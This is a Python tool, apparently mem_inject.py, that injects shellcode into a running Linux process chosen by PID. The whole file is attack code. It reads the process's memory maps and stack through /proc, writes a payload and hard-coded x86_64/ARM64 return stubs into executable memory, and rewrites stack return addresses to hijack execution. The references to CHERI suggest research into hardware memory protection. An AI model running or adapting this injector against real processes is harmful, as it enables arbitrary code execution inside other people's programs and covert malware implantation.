#!/usr/bin/env python3

from time import sleep
from sys import argv
from os.path import exists, join, basename

from signal import SIGSTOP, SIGCONT
from os import kill as sig
from os import fdopen
from struct import pack
from platform import machine

from src.shellcode import shellcode_cheri, shellcode_nocheri

pointer_size = 8   # 4
pchar = 'Q'        # I
delay = 10

def maps_parsing(data_maps):
    lst_maps = []
    lines = data_maps.split("\n")
    for i in range(len(lines) - 1):
        values = lines[i].split()
        dct = {}
        start, finish = values[0].split("-")
        dct["addr_start"] = int(start, 16)
        dct["addr_finish"] = int(finish, 16)
        dct["size"] = int(finish, 16) - int(start, 16)
        dct["str_addr_start"] = start
        dct["str_addr_finish"] = finish
        dct["perms"] = values[1]
        dct["offset"] = values[2]
        dct["dev"] = values[3]
        dct["inode"] = values[4]
        if len(values) == 6:
            dct["pathname"] = values[5]
        lst_maps.append(dct)
    return lst_maps

def get_pathnames(lst_maps):
    pathnames = {}
    for i in range(len(lst_maps)):
        if "pathname" in lst_maps[i] and "perms" in lst_maps[i]:
            pathname = basename(lst_maps[i]["pathname"])
            perms = lst_maps[i]["perms"]
            if "x" in perms or pathname == "[stack]":
                pathnames[pathname] = lst_maps[i]
    return pathnames

def lst_to_bytes(lst):
    return b"".join(map(lambda x: bytes([x]), lst))

def find_addrs_in_mem(data, pathnames, offset, checkflag=True):
    ret_dct = {}
    acc = 0

    if checkflag:
        if data[:2*pointer_size] != 2*pointer_size*b"\x00":
            value = 0
            shift = pointer_size
            for i in range(pointer_size):
                value += (2**pointer_size)**i * data[i+shift]
            bytesize = (value + 1) * 2*pointer_size
            print("[!] Stack may has been infected before (count is {:d}, size={:d})".format(value, bytesize))
            data = bytesize*b"\x00" + data[bytesize:]

    for key, dct in pathnames.items():
        lst = []
        for i in range(len(data) - pointer_size + 1):
            value = 0
            for j in range(pointer_size):
                value += (2**pointer_size)**j * data[i+j]
            if dct["addr_start"] < value < dct["addr_finish"]:
                lst.append([i+offset, value])
                acc += 1
        ret_dct[key] = lst
    return ret_dct

def code_execute(pid, pathnames, retcode, nextcode, flag_norestore):
    path_mem = "/proc/{:d}/mem".format(pid)
    stack = pathnames["[stack]"]
    print(pathnames)

    libc = None
    vdso = None
    del pathnames["[stack]"]

    # Find libc
    for key, values in pathnames.items():
        print("library:", key)
        if "libc" in key:
            libc = values
            break
        if "vdso" in key:
            vdso = values
        
    # Use vDSO if libc is not found
    if libc is None:
        if vdso is not None:
            libc = vdso
        else:
            print("[!] Libc Error")
            return -1

    # Calculate payload size
    payload_size = len(nextcode) + len(retcode) + pointer_size

    # Collect all valid addresses from pathnames
    chosen_addr = None
    found_addresses = []

    for key, values in pathnames.items():
        if "addr_start" in values and "addr_finish" in values:
            start_addr = values["addr_start"]
            end_addr = values["addr_finish"]
            found_addresses.append((start_addr, end_addr))

    if not found_addresses:
        print("[!] No valid addresses found.")
        return -1

    # Select the first available address for injection
    chosen_addr = found_addresses[0][0]  # Example: pick the start of the first found address

    # Backup the current memory at the chosen address
    try:
        with open(path_mem, 'rb') as m:
            m.seek(chosen_addr)
            backup = m.read(payload_size)
    except Exception as e:
        print(f"[!] Error backing up memory: {e}")
        return -1

    stack_base = stack["addr_start"]
    data = b""

    try:
        with open(path_mem, 'rb') as m:
            m.seek(stack_base)
            data = m.read(stack["size"])
    except Exception as e:
        print(f"[!] Error reading stack memory: {e}")
        return -1

    # Find return addresses in memory
    ret_dct = find_addrs_in_mem(data, pathnames, stack_base)
    retcode_addr = chosen_addr + len(nextcode)
    stack_retstruct = b""
    acc = 0

    for key, values in sorted(ret_dct.items()):
        print("[~] {}: {:d} found".format(key, len(values)))
        acc += len(values)
        for pair in values:
            print("    0x{:x} -> 0x{:x}".format(pair[0], pair[1]))
            stack_retstruct += pack(pchar, pair[0])
            stack_retstruct += pack(pchar, pair[1])
    print("[*] total is {:d}".format(acc))

    # Prepare the stack return structure
    stack_retstruct = pack(pchar, chosen_addr) + pack(pchar, acc) + stack_retstruct

    # Write the shellcode to memory
    try:
        with open(path_mem, 'wb') as m:
            m.seek(chosen_addr)
            m.write(nextcode + retcode + pack(pchar, stack_base))
            print("[*] Injected code at 0x{:x}, retcode addr is 0x{:x}".format(chosen_addr, retcode_addr))
            m.seek(stack_base)
            m.write(stack_retstruct)

            # Modify return addresses in the stack
            for values in sorted(ret_dct.values()):
                for pair in values:
                    m.seek(pair[0])
                    retcode_addr_bytes = pack(pchar, retcode_addr)
                    m.write(retcode_addr_bytes)
                    print(f"[*] Modified return address at 0x{pair[0]:x} to 0x{retcode_addr:x}")

    except Exception as e:
        print(f"[!] Error writing to memory: {e}")
        return -1

    # Restore original memory if required
    if not flag_norestore:
        sleep(delay)
        try:
            with open(path_mem, 'wb') as m:
                m.seek(chosen_addr)
                m.write(backup)
        except Exception as e:
            print(f"[!] Error restoring memory: {e}")
            return -1

    return 0


def main(pid, shellcode, flag_norestore=False):
    print("current pid is {:d}\n".format(pid))
    path_maps = "/proc/{:d}/maps".format(pid)
    if not exists(path_maps):
        print("[!] proc doesn't exist")
        return -1
    with open(path_maps, "r") as f:
        data_maps = f.read()
    lst_maps = maps_parsing(data_maps)
    pathnames = get_pathnames(lst_maps)

    if machine() == "x86_64":
        retcode = [0xeb, 0x68, 0x50, 0x50, 0x53, 0x51, 0x52, 0x56, 0x57, 0x48, 0x8b, 0x44, 0x24, 0x38, 0x48, 0x8b, 0x0, 0x48, 0x31, 0xc9, 0x48, 0x8b, 0x18, 0x48, 0x89, 0x8, 0x48, 0x89, 0xe6, 0x48, 0x83, 0xc6, 0x38, 0x48, 0x8b, 0x48, 0x8, 0x48, 0x83, 0xc0, 0x10, 0xeb, 0x8, 0x48, 0x89, 0x16, 0x48, 0x85, 0xdb, 0x74, 0x23, 0x48, 0xff, 0xc9, 0x48, 0x8b, 0x38, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x8b, 0x10, 0x48, 0x83, 0xc0, 0x8, 0x48, 0x85, 0xdb, 0x74, 0x3, 0x48, 0x89, 0x17, 0x48, 0x31, 0xf7, 0x74, 0xda, 0x48, 0x85, 0xc9, 0x75, 0xdd, 0x48, 0x89, 0x5e, 0xf8, 0x48, 0x85, 0xdb, 0x5f, 0x5e, 0x5a, 0x59, 0x5b, 0x58, 0x75, 0x4, 0x48, 0x83, 0xc4, 0x8, 0xc3, 0xe8, 0x93, 0xff, 0xff, 0xff]
    else:
        retcode = [0xe1, 0x3, 0x1f, 0xf8, 0xe2, 0x83, 0x1e, 0xf8, 0xe3, 0x3, 0x1e, 0xf8, 0xe4, 0x83, 0x1d, 0xf8, 0xe5, 0x3, 0x1d, 0xf8, 0xe6, 0x83, 0x1c, 0xf8, 0xe7, 0x3, 0x1c, 0xf8, 0xe8, 0x83, 0x1b, 0xf8, 0xe9, 0x3, 0x1b, 0xf8, 0xea, 0x83, 0x1a, 0xf8, 0xea, 0x3, 0x0, 0x91, 0x4a, 0x21, 0x0, 0xd1, 0x2a, 0x0, 0x0, 0x94, 0xc8, 0xb, 0x80, 0xd2, 0x1, 0x0, 0x0, 0xd4, 0xc4, 0x3, 0x40, 0xf9, 0x85, 0x0, 0x40, 0xf9, 0x63, 0x0, 0x3, 0xca, 0x83, 0x0, 0x0, 0xf9, 0x83, 0x4, 0x40, 0xf9, 0x6, 0x1, 0x80, 0xd2, 0x6, 0x0, 0x0, 0x94, 0x48, 0x1, 0x0, 0xf9, 0xfe, 0x3, 0x8, 0xaa, 0xbf, 0x0, 0x0, 0xf1, 0x21, 0x1, 0x0, 0x54, 0x20, 0x40, 0x0, 0x94, 0x63, 0x4, 0x0, 0xd1, 0xc6, 0x20, 0x0, 0x91, 0x87, 0x68, 0x66, 0xf8, 0xc6, 0x20, 0x0, 0x91, 0x88, 0x68, 0x66, 0xf8, 0xff, 0x0, 0xa, 0xeb, 0xa0, 0xfe, 0xff, 0x54, 0xbf, 0x0, 0x0, 0xf1, 0x40, 0x0, 0x0, 0x54, 0xe8, 0x0, 0x0, 0xf9, 0x7f, 0x0, 0x0, 0xf1, 0xa1, 0xfe, 0xff, 0x54, 0xfe, 0x83, 0x1f, 0xf8, 0xe0, 0x3, 0x5, 0xaa, 0xe1, 0x3, 0x5f, 0xf8, 0xe2, 0x83, 0x5e, 0xf8, 0xe3, 0x3, 0x5e, 0xf8, 0xe4, 0x83, 0x5d, 0xf8, 0xe5, 0x3, 0x5d, 0xf8, 0xe6, 0x83, 0x5c, 0xf8, 0xe7, 0x3, 0x5c, 0xf8, 0xe8, 0x83, 0x5b, 0xf8, 0xe9, 0x3, 0x5b, 0xf8, 0xea, 0x83, 0x5a, 0xf8, 0x1f, 0x0, 0x0, 0xf1, 0x0, 0x0, 0x1f, 0xd6, 0xc0, 0x3, 0x5f, 0xd6, 0xe6, 0x3, 0x1e, 0xaa, 0xd8, 0xff, 0xff, 0x97]

    retcode = lst_to_bytes(retcode)
    shellcode = lst_to_bytes(shellcode)

    code_execute(pid, pathnames, retcode, shellcode, flag_norestore)



if __name__ == "__main__":
    if len(argv) >= 3:
        pid = int(argv[1])
        cheri_on = str(argv[2])
        flag = True
        if len(argv) >= 4:
            flag = int(argv[3])
        if str(argv[2]) == "cheri_on":
            main(pid, shellcode_cheri, flag_norestore=flag)
        elif str(argv[2]) == "cheri_off":
            main(pid, shellcode_nocheri, flag_norestore=flag)
        else:
            print("usage: ./mem_inject.py 1337 cheri_on")    
    else:
        print("usage: ./mem_inject.py 1337 cheri_on")
